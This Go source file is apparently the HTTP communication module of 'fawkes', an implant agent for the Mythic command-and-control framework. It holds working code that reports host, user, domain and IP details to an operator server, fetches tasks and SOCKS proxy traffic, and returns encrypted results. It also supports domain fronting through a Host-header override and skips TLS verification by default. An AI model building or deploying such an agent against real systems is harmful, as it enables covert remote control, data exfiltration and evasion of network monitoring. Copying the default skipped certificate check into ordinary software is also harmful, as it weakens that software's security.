package http

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

// HTTPProfile handles HTTP communication with Mythic
type HTTPProfile struct {
	BaseURL       string
	UserAgent     string
	EncryptionKey string
	MaxRetries    int
	SleepInterval int
	Jitter        int
	Debug         bool
	GetEndpoint   string
	PostEndpoint  string
	HostHeader    string // Override Host header for domain fronting
	client        *http.Client
	CallbackUUID  string // Store callback UUID from initial checkin
}

// NewHTTPProfile creates a new HTTP profile
func NewHTTPProfile(baseURL, userAgent, encryptionKey string, maxRetries, sleepInterval, jitter int, debug bool, getEndpoint, postEndpoint, hostHeader, proxyURL, tlsVerify string) *HTTPProfile {
	profile := &HTTPProfile{
		BaseURL:       baseURL,
		UserAgent:     userAgent,
		EncryptionKey: encryptionKey,
		MaxRetries:    maxRetries,
		SleepInterval: sleepInterval,
		Jitter:        jitter,
		Debug:         debug,
		GetEndpoint:   getEndpoint,
		PostEndpoint:  postEndpoint,
		HostHeader:    hostHeader,
	}

	// Configure TLS based on verification mode
	tlsConfig := buildTLSConfig(tlsVerify)

	// Configure transport with optional proxy
	transport := &http.Transport{
		TLSClientConfig:     tlsConfig,
		MaxIdleConns:        10,
		MaxIdleConnsPerHost: 5,
		IdleConnTimeout:     90 * time.Second,
	}

	// Configure proxy if specified
	if proxyURL != "" {
		if proxyU, err := url.Parse(proxyURL); err == nil {
			transport.Proxy = http.ProxyURL(proxyU)
		}
	}

	profile.client = &http.Client{
		Timeout:   30 * time.Second,
		Transport: transport,
	}

	return profile
}

// buildTLSConfig creates a TLS configuration based on the verification mode.
// Modes: "none" (skip verification), "system-ca" (OS trust store), "pinned:<hex-sha256>" (cert pin)
func buildTLSConfig(tlsVerify string) *tls.Config {
	switch {
	case tlsVerify == "system-ca":
		// Use the operating system's certificate trust store
		return &tls.Config{
			InsecureSkipVerify: false,
			MinVersion:         tls.VersionTLS12,
		}
	case strings.HasPrefix(tlsVerify, "pinned:"):
		// Pin to a specific certificate SHA-256 fingerprint
		fingerprint := strings.TrimPrefix(tlsVerify, "pinned:")
		expectedHash, err := hex.DecodeString(fingerprint)
		if err != nil || len(expectedHash) != 32 {
			// Invalid fingerprint — fall back to skip verify to avoid bricking the agent
			return &tls.Config{InsecureSkipVerify: true}
		}
		return &tls.Config{
			InsecureSkipVerify: true, // We do our own verification in VerifyPeerCertificate
			MinVersion:         tls.VersionTLS12,
			VerifyPeerCertificate: func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
				if len(rawCerts) == 0 {
					return fmt.Errorf("no certificates presented")
				}
				// Hash the leaf certificate's raw DER bytes
				hash := sha256.Sum256(rawCerts[0])
				if !bytes.Equal(hash[:], expectedHash) {
					return fmt.Errorf("certificate fingerprint mismatch")
				}
				return nil
			},
		}
	default:
		// "none" or unrecognized — skip verification (backward compatible default)
		return &tls.Config{InsecureSkipVerify: true}
	}
}

// Checkin performs the initial checkin with Mythic
func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
	checkinMsg := structs.CheckinMessage{
		Action:       "checkin",
		PayloadUUID:  agent.PayloadUUID,
		User:         agent.User,
		Host:         agent.Host,
		PID:          agent.PID,
		OS:           agent.OS,
		Architecture: agent.Architecture,
		Domain:       agent.Domain,
		IPs:          []string{agent.InternalIP},
		ExternalIP:   agent.ExternalIP,
		ProcessName:  agent.ProcessName,
		Integrity:    agent.Integrity,
	}

	if h.Debug {
		// log.Printf("[DEBUG] Checkin message: %+v", checkinMsg)
	}

	body, err := json.Marshal(checkinMsg)
	if err != nil {
		return fmt.Errorf("failed to marshal checkin message: %w", err)
	}

	// Encrypt if encryption key is provided
	if h.EncryptionKey != "" {
		body = h.encryptMessage(body)
		if h.Debug {
			// log.Printf("[DEBUG] Checkin message encrypted")
		}
	}

	// Send using Freyja-style format: UUID + JSON, then base64 encode
	messageData := append([]byte(agent.PayloadUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	// Send checkin request to configured endpoint
	resp, err := h.makeRequest("POST", h.PostEndpoint, []byte(encodedData))
	if err != nil {
		return fmt.Errorf("checkin request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("checkin failed with status: %d", resp.StatusCode)
	}

	// Read and process the checkin response to extract callback UUID
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read checkin response: %w", err)
	}

	if h.Debug {
		// log.Printf("[DEBUG] Checkin response body: %s", string(respBody))
	}

	// Decrypt the checkin response if needed
	var decryptedResponse []byte
	if h.EncryptionKey != "" {
		// Base64 decode the response
		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
		if err != nil {
			// log.Printf("[DEBUG] Failed to decode checkin response: %v", err)
			return fmt.Errorf("failed to decode checkin response: %w", err)
		}

		// Decrypt the response
		decryptedResponse, err = h.decryptResponse(decodedData)
		if err != nil {
			// log.Printf("[DEBUG] Failed to decrypt checkin response: %v", err)
			return fmt.Errorf("failed to decrypt checkin response: %w", err)
		}
	} else {
		decryptedResponse = respBody
	}

	// Parse the response to extract callback UUID
	var checkinResponse map[string]interface{}
	if err := json.Unmarshal(decryptedResponse, &checkinResponse); err != nil {
		// log.Printf("[DEBUG] Failed to parse checkin response as JSON: %v", err)
		// log.Printf("[DEBUG] Decrypted response: %s", string(decryptedResponse))
		return fmt.Errorf("failed to parse checkin response: %w", err)
	}

	// Extract callback UUID (commonly called 'id' or 'uuid' in response)
	if callbackID, exists := checkinResponse["id"]; exists {
		if callbackStr, ok := callbackID.(string); ok {
			h.CallbackUUID = callbackStr
			log.Printf("[INFO] Received callback UUID: %s", h.CallbackUUID)
		}
	} else if callbackUUID, exists := checkinResponse["uuid"]; exists {
		if callbackStr, ok := callbackUUID.(string); ok {
			h.CallbackUUID = callbackStr
			log.Printf("[INFO] Received callback UUID: %s", h.CallbackUUID)
		}
	} else {
		log.Printf("[WARNING] No callback UUID found in checkin response, using payload UUID")
		h.CallbackUUID = agent.PayloadUUID
	}

	return nil
}

// GetTasking retrieves tasks and inbound SOCKS data from Mythic, sending any pending outbound SOCKS data
func (h *HTTPProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
	if h.Debug {
		// log.Printf("[DEBUG] GetTasking URL: %s%s", h.BaseURL, h.GetEndpoint)
	}
	taskingMsg := structs.TaskingMessage{
		Action:      "get_tasking",
		TaskingSize: -1, // Get all pending tasks (important for SOCKS throughput)
		Socks:       outboundSocks,
		// Include agent identification for checkin updates
		PayloadUUID: h.getActiveUUID(agent), // Use callback UUID if available
		PayloadType: "fawkes",
		C2Profile:   "http",
	}

	body, err := json.Marshal(taskingMsg)
	if err != nil {
		return nil, nil, fmt.Errorf("failed to marshal tasking message: %w", err)
	}

	// Encrypt if encryption key is provided
	if h.EncryptionKey != "" {
		body = h.encryptMessage(body)
		if h.Debug {
			// log.Printf("[DEBUG] Tasking message encrypted")
		}
	}

	// Send using Freyja-style format: UUID + JSON, then base64 encode
	activeUUID := h.getActiveUUID(agent)
	messageData := append([]byte(activeUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	resp, err := h.makeRequest("POST", h.PostEndpoint, []byte(encodedData))
	if err != nil {
		// log.Printf("[DEBUG] GetTasking makeRequest failed: %v", err)
		return nil, nil, fmt.Errorf("get tasking request failed: %w", err)
	}
	defer resp.Body.Close()

	// log.Printf("[DEBUG] GetTasking response status: %d", resp.StatusCode)

	if resp.StatusCode != http.StatusOK {
		// log.Printf("[DEBUG] GetTasking failed with non-200 status: %d", resp.StatusCode)
		return nil, nil, fmt.Errorf("get tasking failed with status: %d", resp.StatusCode)
	}

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		// log.Printf("[DEBUG] Failed to read GetTasking response body: %v", err)
		return nil, nil, fmt.Errorf("failed to read response body: %w", err)
	}

	// log.Printf("[DEBUG] GetTasking response body length: %d", len(respBody))
	// log.Printf("[DEBUG] GetTasking response body: %s", string(respBody))

	// Decrypt the response if encryption key is provided
	var decryptedData []byte
	if h.EncryptionKey != "" {
		if h.Debug {
			// log.Printf("[DEBUG] Decrypting response...")
		}
		// First, base64 decode the response
		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
		if err != nil {
			return nil, nil, fmt.Errorf("failed to decode response: %w", err)
		}

		// Decrypt the decoded data
		decryptedData, err = h.decryptResponse(decodedData)
		if err != nil {
			return nil, nil, fmt.Errorf("failed to decrypt response: %w", err)
		}
		if h.Debug {
			// log.Printf("[DEBUG] Decryption successful")
		}
	} else {
		decryptedData = respBody
	}

	// log.Printf("[DEBUG] Attempting to parse response as JSON")

	// Parse the decrypted response - Mythic returns different formats
	var taskResponse map[string]interface{}
	if err := json.Unmarshal(decryptedData, &taskResponse); err != nil {
		// If not JSON, might be no tasks
		// log.Printf("[DEBUG] Response is not JSON, assuming no tasks: %v", err)
		return []structs.Task{}, nil, nil
	}

	// log.Printf("[DEBUG] Parsed JSON response with %d top-level keys", len(taskResponse))
	// for key, _ := range taskResponse {
	//	// log.Printf("[DEBUG] Response contains key: %s", key)
	// }

	// Extract tasks from response
	var tasks []structs.Task
	if taskList, exists := taskResponse["tasks"]; exists {
		if taskArray, ok := taskList.([]interface{}); ok {
			for _, taskData := range taskArray {
				if taskMap, ok := taskData.(map[string]interface{}); ok {
					task := structs.Task{
						ID:      getString(taskMap, "id"),
						Command: getString(taskMap, "command"),
						Params:  getString(taskMap, "parameters"),
					}
					tasks = append(tasks, task)
				}
			}
		}
	}

	// Extract SOCKS messages from response
	var inboundSocks []structs.SocksMsg
	if socksList, exists := taskResponse["socks"]; exists {
		if socksRaw, err := json.Marshal(socksList); err == nil {
			json.Unmarshal(socksRaw, &inboundSocks)
		}
	}

	return tasks, inboundSocks, nil
}

// decryptResponse decrypts a response from Mythic using the same format as Freyja
func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
	if h.EncryptionKey == "" {
		return encryptedData, nil // No encryption
	}

	// Decode the base64 key
	key, err := base64.StdEncoding.DecodeString(h.EncryptionKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
	}

	// The response format should be: UUID (36 bytes) + IV (16 bytes) + Ciphertext + HMAC (32 bytes)
	if len(encryptedData) < 36+16+32 {
		return nil, fmt.Errorf("encrypted data too short: %d bytes", len(encryptedData))
	}

	// Extract UUID (first 36 bytes)
	_ = encryptedData[:36] // uuidBytes for potential debug use
	if h.Debug {
		// log.Printf("[DEBUG] Response UUID: %s", string(uuidBytes))
	}

	// Extract IV (next 16 bytes)
	iv := encryptedData[36:52]

	// Extract HMAC (last 32 bytes)
	hmacBytes := encryptedData[len(encryptedData)-32:]

	// Extract ciphertext (everything between IV and HMAC)
	ciphertext := encryptedData[52 : len(encryptedData)-32]

	// log.Printf("[DEBUG] Data lengths - Total: %d, UUID: 36, IV: 16, Ciphertext: %d, HMAC: 32", len(encryptedData), len(ciphertext))

	// Verify HMAC
	mac := hmac.New(sha256.New, key)
	dataForHmac := encryptedData[:len(encryptedData)-32] // Everything except HMAC
	mac.Write(dataForHmac)
	expectedHmac := mac.Sum(nil)

	if h.Debug {
		// log.Printf("[DEBUG] HMAC verification: %v", hmac.Equal(hmacBytes, expectedHmac))
	}

	if !hmac.Equal(hmacBytes, expectedHmac) {
		if h.Debug {
			// log.Printf("[DEBUG] Primary HMAC failed, trying alternative methods...")
		}

		// Try HMAC on IV + ciphertext (alternative method for Mythic)
		mac3 := hmac.New(sha256.New, key)
		mac3.Write(encryptedData[36 : len(encryptedData)-32]) // IV + ciphertext
		expectedHmac3 := mac3.Sum(nil)

		if !hmac.Equal(hmacBytes, expectedHmac3) {
			return nil, fmt.Errorf("HMAC verification failed with all methods")
		}
		if h.Debug {
			// log.Printf("[DEBUG] Alternative HMAC method succeeded")
		}
	}

	// Decrypt using AES-CBC
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
	}

	if len(ciphertext)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("ciphertext length not multiple of block size")
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	// Remove PKCS#7 padding
	padding := int(plaintext[len(plaintext)-1])
	if padding > aes.BlockSize || padding == 0 {
		return nil, fmt.Errorf("invalid padding")
	}

	for i := len(plaintext) - padding; i < len(plaintext); i++ {
		if plaintext[i] != byte(padding) {
			return nil, fmt.Errorf("invalid padding")
		}
	}

	return plaintext[:len(plaintext)-padding], nil
}

// getActiveUUID returns the callback UUID if available, otherwise the payload UUID
func (h *HTTPProfile) getActiveUUID(agent *structs.Agent) string {
	if h.CallbackUUID != "" {
		// log.Printf("[DEBUG] Using callback UUID: %s", h.CallbackUUID)
		return h.CallbackUUID
	}
	// log.Printf("[DEBUG] Using payload UUID: %s", agent.PayloadUUID)
	return agent.PayloadUUID
}

// PostResponse sends a response back to Mythic, optionally including pending SOCKS data
func (h *HTTPProfile) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
	responseMsg := structs.PostResponseMessage{
		Action:    "post_response",
		Responses: []structs.Response{response},
		Socks:     socks,
	}

	body, err := json.Marshal(responseMsg)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal response message: %w", err)
	}

	// Encrypt if encryption key is provided
	if h.EncryptionKey != "" {
		body = h.encryptMessage(body)
		if h.Debug {
			// log.Printf("[DEBUG] Response message encrypted")
		}
	}

	// Send using Freyja-style format: UUID + JSON, then base64 encode
	// Must use callback UUID (not payload UUID) after checkin
	activeUUID := h.getActiveUUID(agent)
	messageData := append([]byte(activeUUID), body...)
	encodedData := base64.StdEncoding.EncodeToString(messageData)

	resp, err := h.makeRequest("POST", h.PostEndpoint, []byte(encodedData))
	if err != nil {
		return nil, fmt.Errorf("post response request failed: %w", err)
	}
	defer resp.Body.Close()

	// Read response body
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read PostResponse body: %w", err)
	}

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("post response failed with status: %d", resp.StatusCode)
	}

	// Decrypt the response if encryption key is provided (same as GetTasking)
	var decryptedData []byte
	if h.EncryptionKey != "" {
		// First, base64 decode the response
		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
		if err != nil {
			return nil, fmt.Errorf("failed to decode PostResponse: %w", err)
		}

		// Decrypt the decoded data
		decryptedData, err = h.decryptResponse(decodedData)
		if err != nil {
			return nil, fmt.Errorf("failed to decrypt PostResponse: %w", err)
		}
		if h.Debug {
			log.Printf("[DEBUG] PostResponse decryption successful: %s", string(decryptedData))
		}
	} else {
		decryptedData = respBody
	}

	return decryptedData, nil
}

// makeRequest is a helper function to make HTTP requests
func (h *HTTPProfile) makeRequest(method, path string, body []byte) (*http.Response, error) {
	// Ensure proper URL construction with forward slash
	var url string
	if strings.HasSuffix(h.BaseURL, "/") && strings.HasPrefix(path, "/") {
		// Both have slash, remove one
		url = h.BaseURL + path[1:]
	} else if !strings.HasSuffix(h.BaseURL, "/") && !strings.HasPrefix(path, "/") {
		// Neither has slash, add one
		url = h.BaseURL + "/" + path
	} else {
		// One has slash, just concatenate
		url = h.BaseURL + path
	}

	if h.Debug {
		// log.Printf("[DEBUG] Making %s request to %s (body length: %d)", method, url, len(body))
	}

	var reqBody io.Reader
	if body != nil {
		reqBody = bytes.NewReader(body)
	}

	req, err := http.NewRequest(method, url, reqBody)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	// Set headers for Mythic C2
	req.Header.Set("User-Agent", h.UserAgent)
	req.Header.Set("Content-Type", "text/plain")
	req.Header.Set("Accept", "*/*")

	// Override Host header for domain fronting
	if h.HostHeader != "" {
		req.Host = h.HostHeader
	}

	if h.Debug {
		// log.Printf("[DEBUG] Making %s request to %s", method, url)
	}

	resp, err := h.client.Do(req)
	if err != nil {
		// Close body if resp is non-nil on error (e.g., redirect errors)
		if resp != nil && resp.Body != nil {
			resp.Body.Close()
		}
		return nil, fmt.Errorf("HTTP request failed: %w", err)
	}

	return resp, nil
}

// getString safely gets a string value from a map
func getString(m map[string]interface{}, key string) string {
	if val, exists := m[key]; exists {
		if str, ok := val.(string); ok {
			return str
		}
	}
	return ""
}

// encryptMessage encrypts a message exactly like Freyja's AesEncrypt
func (h *HTTPProfile) encryptMessage(msg []byte) []byte {
	if h.EncryptionKey == "" {
		return msg
	}

	// Decode the base64 key
	key, err := base64.StdEncoding.DecodeString(h.EncryptionKey)
	if err != nil {
		if h.Debug {
			// log.Printf("[DEBUG] Failed to decode encryption key: %v", err)
		}
		return msg
	}

	// Create AES cipher
	block, err := aes.NewCipher(key)
	if err != nil {
		if h.Debug {
			// log.Printf("[DEBUG] Failed to create AES cipher: %v", err)
		}
		return msg
	}

	// Generate random IV
	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		if h.Debug {
			// log.Printf("[DEBUG] Failed to generate IV: %v", err)
		}
		return msg
	}

	// Create CBC encrypter
	mode := cipher.NewCBCEncrypter(block, iv)

	// Pad the message to block size
	padded, err := pkcs7Pad(msg, aes.BlockSize)
	if err != nil {
		if h.Debug {
			// log.Printf("[DEBUG] Failed to pad message: %v", err)
		}
		return msg
	}

	// Encrypt the message
	encrypted := make([]byte, len(padded))
	mode.CryptBlocks(encrypted, padded)

	// Freyja format: IV + Ciphertext
	ivCiphertext := append(iv, encrypted...)

	// Create HMAC of IV + Ciphertext
	hmacHash := hmac.New(sha256.New, key)
	hmacHash.Write(ivCiphertext)
	hmacBytes := hmacHash.Sum(nil)

	// Freyja format: IV + Ciphertext + HMAC
	return append(ivCiphertext, hmacBytes...)
}

// pkcs7Pad adds PKCS#7 padding (matching Freyja's implementation)
func pkcs7Pad(data []byte, blockSize int) ([]byte, error) {
	if blockSize <= 0 {
		return nil, fmt.Errorf("invalid blocksize")
	}
	if data == nil || len(data) == 0 {
		return nil, fmt.Errorf("invalid PKCS7 data (empty or not padded)")
	}
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padText...), nil
}
